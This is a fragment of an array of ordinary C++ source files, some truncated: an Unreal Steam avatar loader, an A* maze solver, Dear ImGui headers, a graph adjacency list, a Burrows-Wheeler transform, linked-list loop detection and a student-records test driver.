(pow(common_ratio, no_of_terms - 1)); //This calculates the first term of the sequence.\n                cout << \"\\nThe first term of GP is \" << first_term;\n                break;\n            }\n\n        case 2:\n            if (input2 == 2)\n            {\n                cout << \"Enter first term: \";\n                cin >> first_term;\n\n                cout << \"Enter the common ratio: \";\n                cin >> common_ratio;\n\n                cout << \"Enter the (tn) nth term: \";\n                cin >> nth_term;\n\n     ",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"AsyncActions/GetSteamAvatarAsyncAction.h\"\n\n#include <steam/isteamutils.h>\n\n#include \"Enums/SteamPersonaChange.h\"\n#include \"Subsystems/SteamDomeFriendsSubsystem.h\"\n\n\nUGetSteamAvatarAsyncAction* UGetSteamAvatarAsyncAction::GetSteamAvatar(\n\tconst UObject* WorldContextObject, const FSteamId SteamId, const ESteamAvatarSize AvatarSize\n) {\n\tauto* Instance = NewObject<UGetSteamAvatarAsyncAction>();\n\tInstance->WorldContext = WorldContextObject;\n\tInstance->UserSteamId = SteamId;\n\tInstance->Size = AvatarSize;\n\n\tInstance->RegisterWithGameInstance(WorldContextObject);\n\n\treturn Instance;\n}\n\n\nvoid UGetSteamAvatarAsyncAction::Activate()\n{\n\tSuper::Activate();\n\n\tconst int32 ImageIndex = TryGetLoadedAvatarPictureIndex();\n\n\tif (ImageIndex > 0)\n\t{\n\t\t// Image can be loaded normally\n\t\tauto* AvatarPicture = GetAvatarFromSteamCache(ImageIndex);\n\t\tBroadcastAvatar(AvatarPicture);\n\t\treturn;\n\t}\n\n\t// Handle image not being ready in cache\n\t\n\tif (ImageIndex == 0)\n\t{\n\t\t// Avatar is not set, we need to manually request it\n\t\tSteamDomeFriends = USteamDomeFriendsSubsystem::Get(WorldContext);\n\t\tDelegateHandle = SteamDomeFriends->OnPersonaStateChange.AddUObject(this, &UGetSteamAvatarAsyncAction::OnPersonaStateChange);\n\t\tconst bool bSuccess = SteamDomeFriends->RequestUserInformation(UserSteamId.GetCSteamID(), false);\n\n\t\tif (!bSuccess)\n\t\t{\n\t\t\tStopWithError();\n\t\t}\n\t}\n\telse\n\t{\n\t\t// Avatar is automatically requested by Steamworks,\n\t\t// we just need to wait for the OnAvatarLoaded_t\n\t\tSteamDomeFriends = USteamDomeFriendsSubsystem::Get(WorldContext);\n\t\tDelegateHandle = SteamDomeFriends->OnAvatarImageLoaded.AddUObject(this, &UGetSteamAvatarAsyncAction::OnImageLoaded);\n\t}\n}\n\n\nUTexture2D* UGetSteamAvatarAsyncAction::GetAvatarFromSteamCache(const int32 PictureId, uint32 Width, uint32 Height)\n{\n\tbool bSuccess = SteamUtils()->GetImageSize(PictureId, &Width, &Height);\n\t\n\tif (!bSuccess)\n\t{\n\t\treturn nullptr;\n\t}\n\n\tconstexpr int32 NumChannels = 4; // 4 channels = RGBA\n\tTArray<uint8> AvatarRGBA = TArray<uint8>();\n\tAvatarRGBA.SetNumUninitialized(Width * Height * NumChannels);\n\t\n\tbSuccess = SteamUtils()->GetImageRGBA(\n\t\tPictureId, AvatarRGBA.GetData(), AvatarRGBA.Num()\n\t);\n\t\n\tif (!bSuccess)\n\t{\n\t\treturn nullptr;\n\t}\n\n\treturn UTexture2D::CreateTransient(Width, Height, PF_R8G8B8A8, NAME_None, AvatarRGBA);\n}\n\n\nUTexture2D* UGetSteamAvatarAsyncAction::GetAvatarFromSteamCache(const int32 PictureId)\n{\n\tuint32 Width, Height;\n\tconst bool bSuccess = SteamUtils()->GetImageSize(PictureId, &Width, &Height);\n\t\t\n\tif (!bSuccess)\n\t{\n\t\treturn nullptr;\n\t}\n\n\treturn GetAvatarFromSteamCache(PictureId, Width, Height);\n}\n\n\nvoid UGetSteamAvatarAsyncAction::OnPersonaStateChange(const FSteamId SteamId, const int32 PersonaFlags)\n{\n\tif (SteamId == UserSteamId && PersonaChange::HasBitEnabled(PersonaFlags, ESteamPersonaChange::Avatar))\n\t{\n\t\tSteamDomeFriends->OnPersonaStateChange.Remove(DelegateHandle);\n\t\t\n\t\tconst int32 ImageIndex = TryGetLoadedAvatarPictureIndex();\n\t\tif (ImageIndex <= 0)\n\t\t{\n\t\t\tStopWithError();\n\t\t\treturn;\n\t\t}\n\n\t\tauto* AvatarPicture = GetAvatarFromSteamCache(ImageIndex);\n\t\tBroadcastAvatar(AvatarPicture);\n\t}\n}\n\n\nvoid UGetSteamAvatarAsyncAction::OnImageLoaded(\n\tconst FSteamId SteamId, const int32 PictureId, const int32 Width, const int32 Height\n) {\n\tif (SteamId == UserSteamId)\n\t{\n\t\tSteamDomeFriends->OnAvatarImageLoaded.Remove(DelegateHandle);\n\t\t\n\t\tauto* AvatarPicture = GetAvatarFromSteamCache(PictureId, Width, Height);\n\t\tBroadcastAvatar(AvatarPicture);\n\t}\n}\n\n\nint32 UGetSteamAvatarAsyncAction::TryGetLoadedAvatarPictureIndex()\n{\n\tswitch (Size) {\n\tcase ESteamAvatarSize::Small:\n\t\treturn USteamDomeFriendsSubsystem::GetSmallFriendAvatar(UserSteamId);\n\tcase ESteamAvatarSize::Medium:\n\t\treturn USteamDomeFriendsSubsystem::GetMediumFriendAvatar(UserSteamId);\n\tcase ESteamAvatarSize::Large:\n\t\treturn USteamDomeFriendsSubsystem::GetLargeFriendAvatar(UserSteamId);\n\t}\n\n\tcheckNoEntry();\n\treturn -2;\n}\n\n\nvoid UGetSteamAvatarAsyncAction::BroadcastAvatar(UTexture2D* Texture)\n{\n\tOnFinish.Broadcast(Texture);\n\tSetReadyToDestroy();\n}\n\n\nvoid UGetSteamAvatarAsyncAction::StopWithError()\n{\n\tOnFinish.Broadcast(nullptr);\n\tSetReadyToDestroy();\n}\n",
    "#include <SFML/Graphics.hpp>\n#include <bits/stdc++.h>\n\nusing namespace std;\n\nclass node {\npublic:\n    vector<vector<char>> board;\n    node *parent;\n    string move;\n    bool visited;\n    int costMove;\n    int depth;\n    int g;\n    int h;\n    int f;\n\n    node() : parent(nullptr), visited(false) {} //constructor\n};\nstruct CompareNodes\n{\n    bool operator()(const node *node1, const node *node2) const\n    {\n\n        // Compare nodes based on their f values\n        // Smaller f value has higher priority\n\n        return node1->f > node2->f;\n    }\n};\n\n// Function to create a new node\nnode* createNode(const vector<vector<char>>& board) {\n    node* newNode = new node;\n    newNode->board = board;\n    return newNode;\n}\n\n// Function to check if the current board is the goal state\nbool isGoalState(const vector<vector<char>>& board, const vector<vector<char>>& goalBoard) {\n    return board == goalBoard;\n}\n\n// Function to find the position of the agent ('X')\npair<int, int> findAgent(const vector<vector<char>>& board) {\n    for (int i = 0; i < board.size(); i++) {\n        for (int j = 0; j < board[i].size(); j++) {\n            if (board[i][j] == 'X') {\n                return {i, j};\n            }\n        }\n    }\n    return {-1, -1}; // Agent not found (should not happen)\n}\n\n// Function to generate all valid moves from the current state\nvector<node*> generateMoves(const vector<vector<char>>& board, node* currentNode) {\n    pair<int, int> agentPos = findAgent(board);\n    int XRow = agentPos.first;\n    int XCol = agentPos.second;\n\n    vector<node*> moves;\n    vector<vector<int>> directions = {{-1, 0}, {1, 0}, {0, -1}, {0, 1}};\n    vector<string> moveNames = {\"UP\", \"DOWN\", \"LEFT\", \"RIGHT\"};\n\n    for (int i = 0; i < 4; i++) {\n        int newRow = XRow + directions[i][0];\n        int newCol = XCol + directions[i][1];\n\n        // Check bounds and obstacles\n        if (newRow >= 0 && newRow < board.size() && newCol >= 0 && newCol < board[0].size() && board[newRow][newCol] != '#') {\n            vector<vector<char>> newBoard = board;\n            swap(newBoard[XRow][XCol], newBoard[newRow][newCol]);\n\n            node* newNode = createNode(newBoard);\n            newNode->move = moveNames[i];\n            newNode->parent = currentNode;\n            moves.push_back(newNode);\n        }\n    }\n\n    return moves;\n}\nint Manhattan_start_distance(node* currboard, node* startboard)\n{\n    \n    pair<int, int> start_xy = findAgent(startboard->board);\n    pair<int, int> current_xy = findAgent(currboard->board);\n\n    int start_i = start_xy.first;\n    int start_j = start_xy.second;\n\n    int i = current_xy.first;\n    int j = current_xy.second;\n\n    return abs(i - start_i) + abs(j - start_j);\n}\n\nnode *AStarSearch(vector<vector<char>> &startBoard, vector<vector<char>> &goalBoard)\n{\n\n    node* startNode = createNode(startBoard);\n    node* goalNode = createNode(goalBoard);\n    priority_queue<node *, vector<node *>, CompareNodes> openList;\n    map<vector<vector<char>>, bool> visited;\n\n   \n\n    startNode->h = Manhattan_start_distance(startNode,goalNode);\n    startNode->f = startNode->g + startNode->h;\n    startNode->depth = 0;\n\n    openList.push(startNode);\n    node *solutionNode = nullptr;\n\n    while (!openList.empty())\n    {\n        node *currentNode = openList.top();\n        openList.pop();\n\n        if (isGoalState(currentNode->board, goalBoard))\n        {\n            solutionNode = currentNode;\n            break;\n        }\n\n        visited[currentNode->board] = true;\n//generateMoves(SNAKE, curr->board, curr)\n        for (node *nextMove : generateMoves(currentNode->board, currentNode))\n        {\n            nextMove->g = currentNode->g + 1;\n            nextMove->h = Manhattan_start_distance(nextMove, goalNode);\n            nextMove->f = nextMove->g + nextMove->h;\n\n            if (visited.find(nextMove->board) == visited.end())\n            {\n                nextMove->parent = currentNode;\n                openList.push(nextMove);\n            }\n            else\n            {\n                delete nextMove;\n            }\n        }\n    }\n\n    return solutionNode;\n}\n\n// Function to generate a random maze\nvector<vector<char>> generateRandomMaze(int rows, int cols, double obstacleProbability) {\n    vector<vector<char>> maze(rows, vector<char>(cols, ' '));\n\n    random_device rd;\n    mt19937 gen(rd());\n    uniform_real_distribution<> dis(0.0, 1.0);\n\n    for (int i = 0; i < rows; i++) {\n        for (int j = 0; j < cols; j++) {\n            if (dis(gen) < obstacleProbability) {\n                maze[i][j] = '#';\n            }\n        }\n    }\n\n    // Ensure start and goal positions are not blocked\n    maze[5][5] = 'X';\n    maze[rows - 3][cols - 3] = ' ';\n\n    return maze;\n}\n\n// Function to render the board using SFML\nvoid renderBoard(sf::RenderWindow& window, const vector<vector<char>>& board, int cellSize, const vector<sf::Vertex>& path) {\n    window.clear(sf::Color::White);\n\n    sf::RectangleShape cell(sf::Vector2f(cellSize, cellSize));\n\n    for (int i = 0; i < board.",
    "// dear imgui, v1.91.7 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from win",
    "/*Vi\u1ebft ch\u01b0\u01a1ng tr\u00ecnh c\u00e0i \u0111\u1eb7t \u0111\u1ed3 th\u1ecb cho nh\u01b0 tr\u00ean b\u1ea3ng theo hai c\u1ea5u tr\u00fac l\u01b0u tr\u1eef \r\nS\u1eed d\u1ee5ng ma tr\u1eadn l\u00e2n c\u1eadn -> nh\u1eadp th\u00f4ng tin \u0111\u1ed3 th\u1ecb \r\nS\u1eed d\u1ee5ng danh s\u00e1ch l\u00e2n c\u1eadn  -> nh\u1eadp th\u00f4ng tin \u0111\u1ed3 th\u1ecb \r\nDuy\u1ec7t \u0111\u1ed3 th\u1ecb v\u00e0 in th\u1ee9 t\u1ef1 c\u00e1c \u0111\u1ec9nh theo 2 c\u00e1ch duy\u1ec7t (BFS, DFS)*/\r\n#include <iostream>\r\nusing namespace std;\r\n\r\n\r\n// So dinh\r\nint n;\r\n\r\n// Cau truc danh sach ke\r\nstruct Node {\r\n    int data;\r\n    Node* next;\r\n};\r\n\r\n// Khoi tao danh sach ke\r\nNode* Dsach_ke[100];\r\n\r\n// Ham tao nut moi\r\nNode* createNode(int v) {\r\n    Node* newNode = new Node;\r\n    newNode->data = v;\r\n    newNode->next = NULL;\r\n    return newNode;\r\n}\r\n\r\n\r\n\r\n// Khoi tao danh sach ke\r\nvoid taodanhsachke() {\r\n    for (int i = 0; i < n; i++) {\r\n        Dsach_ke[i] = NULL;\r\n    }\r\n}\r\n\r\n// Them canh vao danh sach ke\r\nvoid themdanhsachke(int u, int v) {\r\n    Node* newNode = createNode(v);\r\n    newNode->next = Dsach_ke[u];\r\n    Dsach_ke[u] = newNode;\r\n\r\n    newNode = createNode(u);\r\n    newNode->next = Dsach_ke[v];\r\n    Dsach_ke[v] = newNode;\r\n}\r\n\r\n// Ham chinh\r\nint main() {\r\n    cout << \"Nhap so dinh: \";\r\n    cin >> n;\r\n    taodanhsachke();\r\n\r\n    int m;\r\n    cout << \"Nhap so canh: \";\r\n    cin >> m;\r\n\r\n    for (int i = 0; i < m; i++) {\r\n        int u, v;\r\n        cout << \"Nhap canh \" << i + 1 << \": \";\r\n        cin >> u >> v;\r\n\r\n        \r\n        themdanhsachke(u, v);\r\n    }\r\n    // In danh sach ke\r\n    cout << \"\\nDanh sach ke:\\n\";\r\n    for (int i = 1; i < n; i++) {\r\n        cout << \"Dinh \" << i << \": \";\r\n        Node* temp = Dsach_ke[i];\r\n        while (temp) {\r\n            cout << temp->data << \" \";\r\n            temp = temp->next;\r\n        }\r\n        cout << endl;\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include <algorithm>\r\n#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nauto customCompare = [](const std::string& a, const std::string& b) {\r\n    for (std::size_t i = 0; i < std::min(a.size(), b.size()); ++i)\r\n    {\r\n        if (a[i] < b[i])\r\n        {\r\n            return true;\r\n        }\r\n        else if (a[i] > b[i])\r\n        {\r\n            return false;\r\n        }\r\n        // If characters are equal, continue to the next character\r\n    }\r\n    // If all compared characters are equal, the shorter string comes first\r\n    return a.size() < b.size();\r\n};\r\n\r\nstring BWT(const string& text) {\r\n    string result = \"\";\r\n\r\n    // vector<vector<char>> M(textDollarAdded.length(), vector<char>(textDollarAdded.length()));\r\n    vector<string> M(text.length());\r\n\r\n    M[0] = \"$\" + text;\r\n    //cout << M[0] << endl;\r\n\r\n    M[0].pop_back();\r\n    //cout << M[0] << endl;\r\n    for (size_t i = 1; i < text.length(); i++)\r\n    {\r\n\r\n        //M[i].insert( M[i].begin(), M[i - 1][text.length() - 1]);\r\n        M[i] = M[i - 1][text.length() - 1] + M[i - 1];\r\n\r\n        //cout << M[i] << endl;\r\n        M[i].pop_back();\r\n\r\n    }\r\n\r\n    std::sort(M.begin(), M.end(), customCompare);\r\n\r\n\r\n\r\n    for (size_t i = 0; i < text.length(); i++)\r\n    {\r\n        result = result + M[i][text.length() - 1];\r\n\r\n    }\r\n\r\n\r\n    // write your code here\r\n\r\n    return result;\r\n}\r\n\r\nint main() {\r\n    string text;\r\n    cin >> text;\r\n    cout << BWT(text) << endl;\r\n    return 0;\r\n}",
    "// dear imgui, v1.91.3 WIP\r\n// (main code and documentation)\r\n\r\n// Help:\r\n// - See links below.\r\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\r\n// - Read top of imgui.cpp for more details, links and comments.\r\n\r\n// Resources:\r\n// - FAQ ........................ https://dearimgui.com/faq (in repository as docs/FAQ.md)\r\n// - Homepage ................... https://github.com/ocornut/imgui\r\n// - Releases & changelog ....... https://github.com/ocornut/imgui/releases\r\n// - Gallery .................... https://github.com/ocornut/imgui/issues?q=label%3Agallery (please post your screenshots/video there!)\r\n// - Wiki ....................... https://github.com/ocornut/imgui/wiki (lots of good stuff there)\r\n//   - Getting Started            https://github.com/ocornut/imgui/wiki/Getting-Started (how to integrate in an existing app by adding ~25 lines of code)\r\n//   - Third-party Extensions     https://github.com/ocornut/imgui/wiki/Useful-Extensions (ImPlot & many more)\r\n//   - Bindings/Backends          https://github.com/ocornut/imgui/wiki/Bindings (language bindings, backends for various tech/engines)\r\n//   - Glossary                   https://github.com/ocornut/imgui/wiki/Glossary\r\n//   - Debug Tools                https://github.com/ocornut/imgui/wiki/Debug-Tools\r\n//   - Software using Dear ImGui  https://github.com/ocornut/imgui/wiki/Software-using-dear-imgui\r\n// - Issues & support ........... https://github.com/ocornut/imgui/issues\r\n// - Test Engine & Automation ... https://github.com/ocornut/imgui_test_engine (test suite, test engine to automate your apps)\r\n\r\n// For first-time users having issues compiling/linking/running/loading fonts:\r\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\r\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\r\n\r\n// Copyright (c) 2014-2024 Omar Cornut\r\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\r\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\r\n// This library is free but needs your support to sustain development and maintenance.\r\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\r\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Funding\r\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\r\n\r\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\r\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\r\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\r\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\r\n// to a better solution or official support for them.\r\n\r\n/*\r\n\r\nIndex of this file:\r\n\r\nDOCUMENTATION\r\n\r\n- MISSION STATEMENT\r\n- CONTROLS GUIDE\r\n- PROGRAMMER GUIDE\r\n  - READ FIRST\r\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\r\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\r\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\r\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\r\n- API BREAKING CHANGES (read me when you update!)\r\n- FREQUENTLY ASKED QUESTIONS (FAQ)\r\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\r\n\r\nCODE\r\n(search for \"[SECTION]\" in the code to find them)\r\n\r\n// [SECTION] INCLUDES\r\n// [SECTION] FORWARD DECLARATIONS\r\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\r\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO, ImGuiPlatformIO)\r\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\r\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\r\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\r\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\r\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\r\n// [SECTION] ImGuiStorage\r\n// [SECTION] ImGuiTextFilter\r\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\r\n// [SECTION] ImGuiListClipper\r\n// [SECTION] STYLING\r\n// [SECTION] RENDER HELPERS\r\n// [SECTION] INITIALIZATION, SHUTDOWN\r\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\r\n// [SECTION] ID STACK\r\n// [SECTION] INPUTS\r\n// [SECTION] ERROR CHECKING, STATE RECOVERY\r\n// [SECTION] ITEM SUBMISSION\r\n// [SECTION] LAYOUT\r\n// [SECTION] SCROLLING\r\n// [SECTION] TOOLTIPS\r\n// [SECTION] POPUPS\r\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\r\n// [SECTION] DRAG AND DROP\r\n// [SECTION] LOGGING/CAPTURING\r\n// [SECTION] SETTINGS\r\n// [SECTION] LOCALIZATION\r\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\r\n// [SECTION] PLATFORM DEPENDENT HELPERS\r\n// [SECTION] METRICS/DEBUGGER WINDOW\r\n// [SECTION] DEBUG LOG WINDOW\r\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICK",
    "#include<bits/stdc++.h>\r\n\r\n\r\n// YOU CAN JUST COPY THE FUNCTION IF YOU NEED IT. THANKS\r\n\r\nusing namespace std;\r\n\r\n// MAKING A NODE CLASS.\r\nclass Node{\r\n\r\n    public:\r\n\r\n        int data;\r\n        Node* next;\r\n\r\n        // USER DEFINED DEFAULT CONSTRUCTOR.\r\n        Node(int d=0){\r\n            this->data = d;\r\n            this->next = NULL;\r\n        }\r\n\r\n        // DESTRUCTOR.\r\n        ~Node(){\r\n            // I AM DOING NOTHING HERE...\r\n        }\r\n};\r\n\r\n// MAKING A LINKED LIST CLASS.\r\nclass LINKED_LIST{\r\n\r\n    public:\r\n\r\n        Node* head;\r\n        Node* tail;\r\n\r\n    public:\r\n\r\n        // USER DEFINED DEFAULT CONSTRUCTOR.\r\n        LINKED_LIST(){\r\n            this->head = NULL;\r\n            this->tail = NULL;\r\n        }\r\n\r\n        // INSERTION FUNCTION TO INSERT DATA AT HEAD.\r\n        void INSERT_HEAD(int data){\r\n\r\n            if(head == NULL){\r\n                head = new Node(data);\r\n                tail = head;\r\n                return;\r\n            }\r\n            \r\n            Node* new_node = new Node(data);\r\n            new_node->next = head;\r\n            head = new_node;\r\n        }\r\n\r\n        // FUNCTION TO DETECT LOOP IN LINKED LIST.\r\n        bool DETECT_LOOP(Node* head) {\r\n        \r\n            Node* slow=head;\r\n            Node* fast=head;\r\n            \r\n            while(fast && fast->next){\r\n                \r\n                slow = slow->next;\r\n                fast = fast->next->next;\r\n                \r\n                if(slow==fast){\r\n                    return true;\r\n                }\r\n            }\r\n            \r\n            return 0;\r\n        }\r\n\r\n\r\n        // FUNCTION TO DISPLAY THE LINKED LIST.\r\n        void DISPLAY(Node* hd){\r\n            \r\n            Node* temp = hd;\r\n\r\n            cout<<\"\\n LINKED LIST  ::  {  \";\r\n            while(temp!=NULL){\r\n                cout<<temp->data<<\"  \";\r\n                temp = temp->next;\r\n            }\r\n            cout<<\"  }\\n\";\r\n        }\r\n\r\n        // DESTRUCTOR.\r\n        ~LINKED_LIST(){\r\n            Node* temp = this->head;\r\n            while(temp!=NULL){\r\n                Node* del = temp;\r\n                temp = temp->next;\r\n                delete del;\r\n            }\r\n        }\r\n};\r\n\r\n\r\n//* MAIN FUNCTION *//\r\nint main(){\r\n\r\n    // CREATING A LINKED LIST.\r\n    LINKED_LIST ll;\r\n    \r\n    // INSERTING ELEMENTS AT HEAD.\r\n    ll.INSERT_HEAD(20);\r\n    ll.INSERT_HEAD(4);\r\n    ll.INSERT_HEAD(15);\r\n    ll.INSERT_HEAD(85);\r\n    ll.INSERT_HEAD(25);\r\n    \r\n    // DISPLAYING THE LINKED LIST.\r\n    cout<<\"\\nOriginal Linked List ::  {  \";\r\n    ll.DISPLAY(ll.head);\r\n    \r\n    // CHECKING FOR LOOP.\r\n    if(ll.DETECT_LOOP(ll.head)){\r\n        cout<<\"\\n LOOP DETECTED.\\n\";\r\n    }\r\n    else{\r\n        cout<<\"\\n NO LOOP DETECTED.\\n\";\r\n    }\r\n    \r\n// EXITING THE PROGRAM.\r\nreturn 0;\r\n}\r\n",
    "#include <iostream>\n#include <string>\n#include \"NewCode.cpp\"\nusing namespace std;\nvoid runTests()\n{\n    StudentRecords students;\n    CourseRecords courses;\n\n    // Test 1: Adding Students\n    cout << \"--- Test 1: Adding Students ---\\n\";\n    try\n    {\n        students.addStudent(1, \"John Doe\", \"john@example.com\", \"123456789\", \"123 Street\", \"password1\");\n        students.addStudent(2, \"Jane Smith\", \"jane@example.com\", \"987654321\", \"456 Avenue\", \"password2\");\n        students.addStudent(1, \"Duplicate\", \"dup@example.com\", \"555555555\", \"789 Road\", \"password3\");\n        students.addStudent(3, \"Karim\", \"KIMO@TOP.com\", \"01010101010\", \"789 Road\", \"password\");\n    }\n    catch (const exception &e)\n    {\n        cout << e.what() << endl;\n    }\n    students.display();\n\n    // Test 2: Adding Courses\n    cout << \"--- Test 2: Adding Courses ---\\n\";\n    try\n    {\n        courses.addCourse(101, \"Mathematics\", 3, \"Dr. Euler\", 2);\n        courses.addCourse(102, \"Physics\", 4, \"Dr. Newton\", 3);\n        courses.addCourse(101, \"Duplicate Course\", 4, \"Dr. Dup\", 1);\n    }\n    catch (const exception &e)\n    {\n        cout << e.what() << endl;\n    }\n\n    // Test 3: Adding Prerequisites\n    cout << \"--- Test 3: Adding Prerequisites ---\\n\";\n    try\n    {\n        courses.addPrerequisite(102, 101); // Physics requires Mathematics\n    }\n    catch (const exception &e)\n    {\n        cout << e.what() << endl;\n    }\n\n    // Test 4: Enrolling Students\n    cout << \"--- Test 4: Enrolling Students ---\\n\";\n    try\n    {\n        courses.enrollStudent(101, 1, students);\n        courses.enrollStudent(101, 2, students);\n        courses.enrollStudent(101, 3, students); // Should go to waitlist\n        courses.enrollStudent(102, 1, students); // Should fail (prerequisite not met)\n    }\n    catch (const exception &e)\n    {\n        cout << e.what() << endl;\n    }\n\n    // Test 5: Dropping a Course\n    cout << \"--- Test 5: Dropping a Course ---\\n\";\n    try\n    {\n        courses.dropCourse(101, 1, students); // Should enroll next from waitlist\n    }\n    catch (const exception &e)\n    {\n        cout << e.what() << endl;\n    }\n\n    // Test 6: Completing a Course\n    cout << \"--- Test 6: Completing a Course ---\\n\";\n    try\n    {\n        courses.completeCourse(101, 2, \"A\", students);\n    }\n    catch (const exception &e)\n    {\n        cout << e.what() << endl;\n    }\n\n    // Test 7: Display All Data\n    cout << \"--- Test 7: Display All Data ---\\n\";\n    cout << \"Students:\\n\";\n    students.display();\n    cout << \"Courses:\\n\";\n    courses.enrollStudent(101, 3, students); // Attempt re-enroll\n}\n\nint main()\n{\n    runTests();\n    return 0;\n}\n",
